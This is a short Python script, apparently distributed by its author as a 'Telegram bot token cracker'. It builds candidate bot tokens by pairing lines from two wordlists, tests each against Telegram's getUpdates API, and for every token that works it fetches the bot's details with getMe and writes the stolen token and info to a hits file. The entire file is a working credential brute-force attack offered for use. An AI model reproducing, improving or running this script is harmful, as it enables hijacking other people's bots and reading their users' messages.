from requests import get


# Author : DrAnDrOiD
# Telegram : t.me/who_drandroid

### ENGLISH 
## COPY RIGHTED DONT COPY
# Tool To crack telegram bots TOKEN
# Capture + : All info about cracked bot
# want to upgrade my code or publish in your place ? DM me on telegram

### FARSI
## Copy right shode lotfan eski narid
# abzari baraye crack tokene bot haye telegram
# daraye capcher tamam moshakhasat bot crack shode
# age mikhaid code am ro upgrade ya jaii post koni yadet nare tagam ziresh bezani
# khasti upgrade koni dar telegram ajaze begir 



### MADE WITH -->HONOR<-- IN IRAN BY IRANIAN



def banner():
    print('''##################################
''')
    print('''# TELEGRAM BOT TOKEN CRACKER     #
''')
    print('''# Author : DrAnDrOiD             #
''')
    print('''# Telegram : t.me/who_drandroid  # 
''')
    print('''##################################''')
banner()
file1 = open("passlist1.txt", "r", encoding="utf-8")
ps1 = file1.read().splitlines()
file1.close()
file2 = open("passlist2.txt")
ps2 = file2.read().splitlines()
file2.close()
file3 = open("hits.txt", "w", encoding="utf-8")
n = 0
hits = []
combo = []
for t in ps1:
    for i in ps2:
        token = t+":"+i
        combo.append(token)
for tk in combo:
    r = get("https://api.telegram.org/bot"+tk+"/Getupdates")
    if '"ok":true' in r.text:
        s = get("https://api.telegram.org/bot"+tk+"/Getme")
        hits.append(tk+"\nINFO:\n"+s.text+"\n\n")
to_print = ""
for p in hits:
    to_print = to_print+p
file3.write(to_print)
file3.close()
print("Done ! check hits.txt file")